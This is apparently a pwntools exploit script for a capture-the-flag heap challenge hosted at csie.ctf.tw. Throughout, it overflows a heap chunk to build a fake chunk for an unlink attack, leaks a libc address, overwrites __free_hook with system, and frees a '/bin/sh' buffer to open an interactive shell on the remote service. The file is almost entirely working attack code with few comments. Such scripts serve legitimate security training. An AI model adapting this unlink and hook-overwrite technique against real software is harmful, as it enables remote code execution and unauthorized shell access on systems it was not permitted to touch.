from pwn import *

r = remote("csie.ctf.tw", 10134)
# r = remote("127.0.0.1", 8888)
context.arch = "amd64"

def new(size, data):
	r.sendlineafter("> ", "1")
	r.sendlineafter(": ", str(size))
	r.sendafter(": ", data)

def my_print(index):
	r.sendlineafter("> ", "2")
	r.sendlineafter(": ", str(index))
	return r.recvline()[:-1]

def edit(index, length, data):
	r.sendlineafter("> ", "3")
	r.sendlineafter(": ", str(index))
	r.sendlineafter(": ", str(length))
	r.sendafter(": ", data)

def delete(index):
	r.sendlineafter("> ", "4")
	r.sendlineafter(": ", str(index))

new(0x108, "a")
new(0x108, "a")
new(0x108, "/bin/sh\x00")

# address of pointer which point to heap 
fake = 0x602040
edit(0, 0x200, flat([0, 0x101, fake-0x18, fake-0x10]).ljust(0x100) + flat([0x100, 0x110]))
delete(1)

# leak libc and get address of __free_hook and system
edit(0, 0x8, "a" * 8)
stdin = u64(my_print(0)[-6:].ljust(8, "\x00"))
libc = stdin - 0x3c38e0
free_hook_off = 0x3c57a8
free_hook = libc + free_hook_off
system_off = 0x45390
system = libc + system_off

# overwrite __free_hook with address of system
edit(0, 0x20, flat([0, stdin, 0, free_hook]))
edit(0, 0x08, p64(system))
# free note 2 = system("/bin/sh\x00")
delete(2)

r.interactive()

